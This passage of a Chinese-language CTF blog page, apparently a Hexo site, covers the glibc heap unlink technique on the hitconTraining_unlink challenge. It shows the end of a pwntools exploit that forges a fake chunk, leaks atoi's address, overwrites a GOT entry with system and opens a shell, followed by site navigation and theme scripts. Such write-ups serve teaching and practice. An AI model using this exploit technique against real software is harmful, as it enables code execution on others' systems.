class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># size = 0xa1</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020C0</span>+<span class="number">0x8</span>   <span class="comment"># 目标篡改地址：全局数组/got表的关键位置（程序固定地址）</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span> <span class="comment"># unlink攻击的fd伪造公式（64位固定）</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span> <span class="comment"># unlink攻击的bk伪造公式（64位固定）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造伪造的chunk0内容（覆盖chunk0的chunk头和用户区）</span></span><br><span class="line">payload1 = p64(<span class="number">0x0</span>)        <span class="comment"># 覆盖chunk0的prev_size（无意义，设0）</span></span><br><span class="line">payload1 += p64(<span class="number">0x91</span>)      <span class="comment"># 伪造chunk0的size：0x90（总大小） + 0x1（P位=1，前块使用中）</span></span><br><span class="line">payload1 += p64(fake_fd)   <span class="comment"># 伪造free chunk的fd指针（指向ptr-0x18）</span></span><br><span class="line">payload1 += p64(fake_bk)   <span class="comment"># 伪造free chunk的bk指针（指向ptr-0x10）</span></span><br><span class="line">payload1 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>      <span class="comment"># 填充：0x90用户区 - 0x20（fd/bk）= 0x70字节</span></span><br><span class="line">payload1 += p64(<span class="number">0x90</span>)      <span class="comment"># 伪造chunk1的prev_size（欺骗glibc计算前块地址）</span></span><br><span class="line">payload1 += p64(<span class="number">0xa0</span>)      <span class="comment"># 伪造chunk1的size（绕过glibc的堆完整性检查）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#change(0,1,b&#x27;a&#x27;)</span></span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload2 += p64(<span class="number">0x602068</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0 :&#x27;</span>)</span><br><span class="line">atoi_addr = p.recvline()[<span class="number">1</span>:<span class="number">7</span>]</span><br><span class="line">atoi_addr = <span class="built_in">int</span>.from_bytes(atoi_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;atoi_addr-------&gt;&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr = atoi_addr + <span class="number">0x453a0</span> - <span class="number">0x36e90</span></span><br><span class="line">payload3 = p64(sys_addr)</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>更新: 2026-04-22 17:29:46<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/zv9xwpzcugfee7pd">https://www.yuque.com/idcm/wnemg9/zv9xwpzcugfee7pd</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Unlink例题分析" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/Unlink%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%88Unsortedbin%EF%BC%89/Unlink%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/" aria-label="前一篇: Unlink例题分析" title="前一篇: Unlink例题分析"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            Unlink例题分析
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="UseAfterFree例题分析" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/UAF_useafterfree/UseAfterFree%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/" aria-label="后一篇: UseAfterFree例题分析"  title="后一篇: UseAfterFree例题分析"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          UseAfterFree例题分析
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%88Unsortedbin%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">Unlink漏洞原理及利用（Unsortedbin）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFunlink%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是unlink？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%A4%8D%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">堆复习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BE%8B%E4%BB%8B%E7%BB%8Dunlink"><span class="toc-number">1.3.</span> <span class="toc-text">通过实例介绍unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3free%E5%90%8Ebin%E7%9A%84%E5%AD%98%E6%94%BE"><span class="toc-number">1.3.1.</span> <span class="toc-text">简单了解free后bin的存放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink%E7%9A%84%E6%A3%80%E6%9F%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">unlink的检查过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink-getshell%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.3.</span> <span class="toc-text">unlink getshell的过程与实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tip%EF%BC%89glibc%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%ABchunk"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">tip）glibc如何识别chunk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unlink%E6%AC%BA%E9%AA%97glibc%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">unlink欺骗glibc过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%9C%AC%E8%B4%A8%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">核心本质总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hitconTraining-unlink"><span class="toc-number">1.4.</span> <span class="toc-text">hitconTraining_unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">基本思路</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "index",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/Unlink%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%88Unsortedbin%EF%BC%89/index/",
+          excerpt: "",
+          description: "",
+          stripContent: "Unlink漏洞原理及利用（Unsortedbin）什么是unlink？unlink 俗称脱链，就是将链表头处的 free 堆块 unsorted bin中脱离出来，然后和物理地址相邻的新 free的堆块合并成大堆块（向前合并或者向后合并）再放入unsorted bin中。 危害原理：通过伪造free状态的fake_chunk，伪造fd指针和bk指针，通过绕过unlink的检查实现unlink，unlink就会往p所在的位置写入p-0x18，从而实现任意地址写的漏洞。 漏洞产生原因：offbyn",
+          date: "Tue Apr 28 2026 18:25:58 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
